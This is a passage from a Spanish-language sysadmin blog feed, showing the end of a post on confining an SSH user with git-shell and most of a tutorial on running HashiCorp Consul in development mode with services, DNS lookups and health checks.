&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Users connected: &lt;/span&gt;&lt;span class="nv"&gt;$n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
server:/home/customer/git-shell-commands# chown customer:customer *
server:/home/customer/git-shell-commands# chmod &lt;span class="m"&gt;755&lt;/span&gt; *
server:/home/customer/git-shell-commands# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora es el momento de que el usuario se conecte y vea el resultado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ssh customer@server
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
customer@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &amp;lt;http://wiki.alpinelinux.org&amp;gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

Permitted commands:
  &lt;span class="nb"&gt;help&lt;/span&gt; - shows this &lt;span class="nb"&gt;help&lt;/span&gt; message
  hostname - shows hostname of this server
  get_connected_users - shows user currently logged on
git&amp;gt; hostname
server
git&amp;gt; &lt;span class="nb"&gt;help&lt;/span&gt;
Permitted commands:
  &lt;span class="nb"&gt;help&lt;/span&gt; - shows this &lt;span class="nb"&gt;help&lt;/span&gt; message
  hostname - shows hostname of this server
  get_connected_users - shows user currently logged on
git&amp;gt; get_connected_users
Users connected: &lt;span class="m"&gt;4&lt;/span&gt;
git&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
Connection to localhost closed.
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y de esta forma, el usuario queda limitado, pero con estos 3 comandos posibles.&lt;/p&gt;</content><category term="git"></category><category term="git-shell"></category><category term="jaula"></category><category term="ssh"></category></entry><entry><title>Monitorización y service discovery con Consul</title><link href="https://www.linuxsysadmin.ml/2018/04/monitorizacion-y-service-discovery-con-consul.html" rel="alternate"></link><published>2018-04-23T10:00:00+02:00</published><updated>2018-04-23T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-04-23:/2018/04/monitorizacion-y-service-discovery-con-consul.html</id><summary type="html">&lt;p&gt;Hace poco me topé con una excelente pieza de &lt;em&gt;software&lt;/em&gt; llamada &lt;strong&gt;Consul&lt;/strong&gt;. Se trata de un binario que proporciona varios servicios: &lt;em&gt;node autodiscovery&lt;/em&gt;, &lt;em&gt;service autodiscovery&lt;/em&gt;, &lt;em&gt;health checking&lt;/em&gt; y almacén de valores &lt;em&gt;key-value&lt;/em&gt;. Todo ello mostrado en una interfaz web y suministrando un servidor DNS y una API que podemos usar …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hace poco me topé con una excelente pieza de &lt;em&gt;software&lt;/em&gt; llamada &lt;strong&gt;Consul&lt;/strong&gt;. Se trata de un binario que proporciona varios servicios: &lt;em&gt;node autodiscovery&lt;/em&gt;, &lt;em&gt;service autodiscovery&lt;/em&gt;, &lt;em&gt;health checking&lt;/em&gt; y almacén de valores &lt;em&gt;key-value&lt;/em&gt;. Todo ello mostrado en una interfaz web y suministrando un servidor DNS y una API que podemos usar.&lt;/p&gt;
&lt;p&gt;La idea es que todo servidor de tu infraestructura ejecuta un agente de &lt;strong&gt;Consul&lt;/strong&gt;, y tras un protocolo de &lt;em&gt;gossip&lt;/em&gt;, todos saben el estado general de nuestra infraestructura.&lt;/p&gt;
&lt;p&gt;Aunque es muy interesante tener uno o varios &lt;em&gt;server nodes&lt;/em&gt; y varios &lt;em&gt;client nodes&lt;/em&gt;, esto queda abierto para un artículo posterior. De momento nos vamos a limitar a tener un &lt;em&gt;server node&lt;/em&gt; para demostración y desarrollo local.&lt;/p&gt;
&lt;h2&gt;Instalación&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Consul&lt;/strong&gt; no necesita instalación; es un solo binario estático que solo tenemos que descargar de la &lt;a href="https://www.consul.io/downloads.html"&gt;página de descargas&lt;/a&gt; y ejecutar.&lt;/p&gt;
&lt;p&gt;En mi caso, y dada mi arquitectura &lt;strong&gt;Linux&lt;/strong&gt; de 64 bits, me descargo el apropiado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul$ wget https://releases.hashicorp.com/consul/1.0.3/consul_1.0.3_linux_amd64.zip
--2018-02-02 &lt;span class="m"&gt;13&lt;/span&gt;:29:34--  https://releases.hashicorp.com/consul/1.0.3/consul_1.0.3_linux_amd64.zip
Conectando con &lt;span class="m"&gt;192&lt;/span&gt;.168.62.4:3128... conectado.
Petición Proxy enviada, esperando respuesta... &lt;span class="m"&gt;200&lt;/span&gt; OK
Longitud: &lt;span class="m"&gt;11102212&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;11M&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/zip&lt;span class="o"&gt;]&lt;/span&gt;
Grabando a: “consul_1.0.3_linux_amd64.zip”

consul_1.0.3_linux_amd64.zip    &lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[=======================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt;  &lt;span class="m"&gt;10&lt;/span&gt;,59M  &lt;span class="m"&gt;1&lt;/span&gt;,29MB/s    in &lt;span class="m"&gt;6&lt;/span&gt;,4s

&lt;span class="m"&gt;2018&lt;/span&gt;-02-02 &lt;span class="m"&gt;13&lt;/span&gt;:29:41 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;,66 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - “consul_1.0.3_linux_amd64.zip” guardado &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;11102212&lt;/span&gt;/11102212&lt;span class="o"&gt;]&lt;/span&gt;

gerard@atlantis:~/projects/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es un fichero &lt;em&gt;.zip&lt;/em&gt; que solamente contiene el binario indicado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul$ unzip -l consul_1.0.3_linux_amd64.zip
Archive:  consul_1.0.3_linux_amd64.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
 &lt;span class="m"&gt;46660030&lt;/span&gt;  &lt;span class="m"&gt;2018&lt;/span&gt;-01-24 &lt;span class="m"&gt;16&lt;/span&gt;:06   consul
---------                     -------
 &lt;span class="m"&gt;46660030&lt;/span&gt;                     &lt;span class="m"&gt;1&lt;/span&gt; file
gerard@atlantis:~/projects/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo necesitamos extraer el contenido del fichero &lt;em&gt;.zip&lt;/em&gt; y ponerlo en algún lugar del &lt;em&gt;path&lt;/em&gt;, o simplemente ejecutarlo con el formato &lt;code&gt;./consul&lt;/code&gt; que es lo que yo voy a hacer.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: El binario viene con los símbolos de &lt;em&gt;debug&lt;/em&gt;. Se puede reducir de 45mb a 26mb haciendo un &lt;code&gt;strip consul&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Ejecución en modo de desarrollo&lt;/h2&gt;
&lt;p&gt;Todos los agentes de consul son servidores o clientes de un &lt;em&gt;cluster&lt;/em&gt; más grande. Sin embargo, y con el único objeto de probar y escribir una configuración útil, se nos ofrece la posibilidad de levantar el agente en modo de desarrollo.&lt;/p&gt;
&lt;p&gt;Esto significa que ejecuta en memoria, sin necesidad de una carpeta local para escribir ninguna información de &lt;em&gt;runtime&lt;/em&gt;, que se levanta como un &lt;em&gt;cluster&lt;/em&gt; de un solo nodo y que levanta la interfaz web, lo que nos viene de perlas para la demostración.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: En un artículo futuro hablaremos de un &lt;em&gt;cluster&lt;/em&gt; adecuado que implique varios nodos.&lt;/p&gt;
&lt;p&gt;Así sin más, lanzamos el comando; no es necesario nada más para algo simple.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul$ ./consul agent -dev
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Starting Consul agent...
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Consul agent running!
           Version: &lt;span class="s1"&gt;&amp;#39;v1.0.3&amp;#39;&lt;/span&gt;
           Node ID: &lt;span class="s1"&gt;&amp;#39;2feeb781-3422-98ef-1938-e5b8494de0dc&amp;#39;&lt;/span&gt;
         Node name: &lt;span class="s1"&gt;&amp;#39;atlantis&amp;#39;&lt;/span&gt;
        Datacenter: &lt;span class="s1"&gt;&amp;#39;dc1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Segment: &lt;span class="s1"&gt;&amp;#39;&amp;lt;all&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
            Server: &lt;span class="nb"&gt;true&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Bootstrap: &lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
       Client Addr: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;HTTP: &lt;span class="m"&gt;8500&lt;/span&gt;, HTTPS: -1, DNS: &lt;span class="m"&gt;8600&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
      Cluster Addr: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 &lt;span class="o"&gt;(&lt;/span&gt;LAN: &lt;span class="m"&gt;8301&lt;/span&gt;, WAN: &lt;span class="m"&gt;8302&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
           Encrypt: Gossip: false, TLS-Outgoing: false, TLS-Incoming: &lt;span class="nb"&gt;false&lt;/span&gt;

&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Log data will now stream in as it occurs:
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Se recomienda usar el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-advertise&lt;/code&gt; para que sepa cual es la dirección que queremos usar para el &lt;em&gt;cluster&lt;/em&gt;. &lt;strong&gt;Consul&lt;/strong&gt; intenta detectarla por sí mismo, pero es fácil que no lo haga como esperamos; es mejor indicarlo explícitamente.&lt;/p&gt;
&lt;p&gt;Esto nos levanta otros dos servicios en &lt;em&gt;localhost&lt;/em&gt; y en diferentes puertos (tanto la IP como los puertos son configurables):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Un servidor DNS en el puerto 8600&lt;/li&gt;
&lt;li&gt;Una bonita interfaz web en el puerto 8500, y una API en el mismo puerto&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Probemos el DNS; solo hay que saber que el nombre en el DNS se saca añadiendo al &lt;em&gt;hostname&lt;/em&gt; el infijo &lt;em&gt;.node&lt;/em&gt; y el sufijo &lt;em&gt;.consul&lt;/em&gt; (configurable también).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; atlantis.node.consul

&lt;span class="p"&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG &lt;span class="m"&gt;9&lt;/span&gt;.10.3-P4-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; atlantis.node.consul
&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; server found&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class="p"&gt;;;&lt;/span&gt; Got answer:
&lt;span class="p"&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class="s"&gt;&amp;lt;&amp;lt;- opco&lt;/span&gt;de: QUERY, status: NOERROR, id: &lt;span class="m"&gt;4332&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; flags: qr aa rd&lt;span class="p"&gt;;&lt;/span&gt; QUERY: &lt;span class="m"&gt;1&lt;/span&gt;, ANSWER: &lt;span class="m"&gt;1&lt;/span&gt;, AUTHORITY: &lt;span class="m"&gt;0&lt;/span&gt;, ADDITIONAL: &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; WARNING: recursion requested but not available

&lt;span class="p"&gt;;;&lt;/span&gt; OPT PSEUDOSECTION:
&lt;span class="p"&gt;;&lt;/span&gt; EDNS: version: &lt;span class="m"&gt;0&lt;/span&gt;, flags:&lt;span class="p"&gt;;&lt;/span&gt; udp: &lt;span class="m"&gt;4096&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; QUESTION SECTION:
&lt;span class="p"&gt;;&lt;/span&gt;atlantis.node.consul.          IN      A

&lt;span class="p"&gt;;;&lt;/span&gt; ANSWER SECTION:
atlantis.node.consul.   &lt;span class="m"&gt;0&lt;/span&gt;       IN      A       &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15

&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;0&lt;/span&gt; msec
&lt;span class="p"&gt;;;&lt;/span&gt; SERVER: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1#8600&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; WHEN: Thu Feb &lt;span class="m"&gt;08&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:28:38 CET &lt;span class="m"&gt;2018&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; MSG SIZE  rcvd: &lt;span class="m"&gt;65&lt;/span&gt;

gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La interfaz web la podemos abrir en un navegador en &lt;a href="http://localhost:8500/"&gt;http://localhost:8500/&lt;/a&gt; y sería algo como esto:&lt;/p&gt;
&lt;p&gt;&lt;img alt="aaa" src="https://1npo9l3lml0zvr6w62acc3t1-wpengine.netdna-ssl.com/wp-content/uploads/2017/06/consul-ui.png"&gt;&lt;/p&gt;
&lt;h2&gt;Declarando servicios&lt;/h2&gt;
&lt;p&gt;Vamos a levantar el agente de la misma forma, pero con el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-config-file&lt;/code&gt;, lo que nos permite poner una configuración específica a nuestras necesidades.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul$ ./consul agent -dev -advertise &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15 --config-file consul.json
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Starting Consul agent...
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Consul agent running!
           Version: &lt;span class="s1"&gt;&amp;#39;v1.0.3&amp;#39;&lt;/span&gt;
           Node ID: &lt;span class="s1"&gt;&amp;#39;183c31b0-33aa-e4f4-ef77-fb844b371403&amp;#39;&lt;/span&gt;
         Node name: &lt;span class="s1"&gt;&amp;#39;atlantis&amp;#39;&lt;/span&gt;
        Datacenter: &lt;span class="s1"&gt;&amp;#39;dc1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Segment: &lt;span class="s1"&gt;&amp;#39;&amp;lt;all&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
            Server: &lt;span class="nb"&gt;true&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Bootstrap: &lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
       Client Addr: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;HTTP: &lt;span class="m"&gt;8500&lt;/span&gt;, HTTPS: -1, DNS: &lt;span class="m"&gt;8600&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
      Cluster Addr: &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15 &lt;span class="o"&gt;(&lt;/span&gt;LAN: &lt;span class="m"&gt;8301&lt;/span&gt;, WAN: &lt;span class="m"&gt;8302&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
           Encrypt: Gossip: false, TLS-Outgoing: false, TLS-Incoming: &lt;span class="nb"&gt;false&lt;/span&gt;

&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Log data will now stream in as it occurs:
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El fichero de configuración declara servicios, en formato JSON; este es el ejemplo que he usado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul$ cat consul.json
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;services&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8001&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8002&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@atlantis:~/projects/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ambos servicios van a aparecer en la interfaz web y en la resolución DNS:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; web.service.consul

&lt;span class="p"&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG &lt;span class="m"&gt;9&lt;/span&gt;.10.3-P4-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; web.service.consul
&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; server found&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class="p"&gt;;;&lt;/span&gt; Got answer:
&lt;span class="p"&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class="s"&gt;&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 21560&lt;/span&gt;
&lt;span class="s"&gt;;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1&lt;/span&gt;
&lt;span class="s"&gt;;; WARNING: recursion requested but not available&lt;/span&gt;

&lt;span class="s"&gt;;; OPT PSEUDOSECTION:&lt;/span&gt;
&lt;span class="s"&gt;; EDNS: version: 0, flags:; udp: 4096&lt;/span&gt;
&lt;span class="s"&gt;;; QUESTION SECTION:&lt;/span&gt;
&lt;span class="s"&gt;;web.service.consul.            IN      A&lt;/span&gt;

&lt;span class="s"&gt;;; ANSWER SECTION:&lt;/span&gt;
&lt;span class="s"&gt;web.service.consul.     0       IN      A       10.0.2.15&lt;/span&gt;

&lt;span class="s"&gt;;; Query time: 0 msec&lt;/span&gt;
&lt;span class="s"&gt;;; SERVER: 127.0.0.1#8600(127.0.0.1)&lt;/span&gt;
&lt;span class="s"&gt;;; WHEN: Thu Feb 08 12:40:37 CET 2018&lt;/span&gt;
&lt;span class="s"&gt;;; MSG SIZE  rcvd: 63&lt;/span&gt;

&lt;span class="s"&gt;gerard@atlantis:~$ dig @127.0.0.1 -p 8600 api.service.consul&lt;/span&gt;

&lt;span class="s"&gt;; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.10.3-P4-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @127.0.0.1 -p 8600 api.service.consul&lt;/span&gt;
&lt;span class="s"&gt;; (1 server found)&lt;/span&gt;
&lt;span class="s"&gt;;; global options: +cmd&lt;/span&gt;
&lt;span class="s"&gt;;; Got answer:&lt;/span&gt;
&lt;span class="s"&gt;;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode&lt;/span&gt;: QUERY, status: NOERROR, id: &lt;span class="m"&gt;6767&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; flags: qr aa rd&lt;span class="p"&gt;;&lt;/span&gt; QUERY: &lt;span class="m"&gt;1&lt;/span&gt;, ANSWER: &lt;span class="m"&gt;1&lt;/span&gt;, AUTHORITY: &lt;span class="m"&gt;0&lt;/span&gt;, ADDITIONAL: &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; WARNING: recursion requested but not available

&lt;span class="p"&gt;;;&lt;/span&gt; OPT PSEUDOSECTION:
&lt;span class="p"&gt;;&lt;/span&gt; EDNS: version: &lt;span class="m"&gt;0&lt;/span&gt;, flags:&lt;span class="p"&gt;;&lt;/span&gt; udp: &lt;span class="m"&gt;4096&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; QUESTION SECTION:
&lt;span class="p"&gt;;&lt;/span&gt;api.service.consul.            IN      A

&lt;span class="p"&gt;;;&lt;/span&gt; ANSWER SECTION:
api.service.consul.     &lt;span class="m"&gt;0&lt;/span&gt;       IN      A       &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15

&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;0&lt;/span&gt; msec
&lt;span class="p"&gt;;;&lt;/span&gt; SERVER: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1#8600&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; WHEN: Thu Feb &lt;span class="m"&gt;08&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:40:38 CET &lt;span class="m"&gt;2018&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; MSG SIZE  rcvd: &lt;span class="m"&gt;63&lt;/span&gt;

gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Si los servicios se declaran en varios nodos del &lt;em&gt;cluster&lt;/em&gt;, el DNS nos va a devolver varias respuestas, indicando todas las direcciones IP en donde esté el servicio.&lt;/p&gt;
&lt;h2&gt;Declarando health checks&lt;/h2&gt;
&lt;p&gt;Los &lt;em&gt;health checks&lt;/em&gt; nos permiten indicar a &lt;strong&gt;consul&lt;/strong&gt; si el nodo o sus servicios están funcionales. Esto se refleja en la web y en la resolución DNS, de forma que no se nos responde una IP si esta no está bien.&lt;/p&gt;
&lt;p&gt;Hay varios modelos de &lt;em&gt;checks&lt;/em&gt;, de acuerdo con &lt;a href="https://www.consul.io/docs/agent/checks.html"&gt;la documentación&lt;/a&gt;. Además, estos &lt;em&gt;checks&lt;/em&gt; pueden estar opcionalemente ligados a un servicio.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Si falla un &lt;em&gt;check&lt;/em&gt; ligado a un servicio, dicho servicio se da por malo.&lt;/li&gt;
&lt;li&gt;Si falla un &lt;em&gt;check&lt;/em&gt; que no está ligado a ningún servicio, el nodo (servidor) entero se da por malo.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Veamos un ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul$ cat consul.json
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;services&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8001&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8002&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;checks&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;ssh&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;tcp&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;localhost:22&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;interval&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;timeout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;service_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;http://localhost:8001/&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;interval&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;timeout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;,
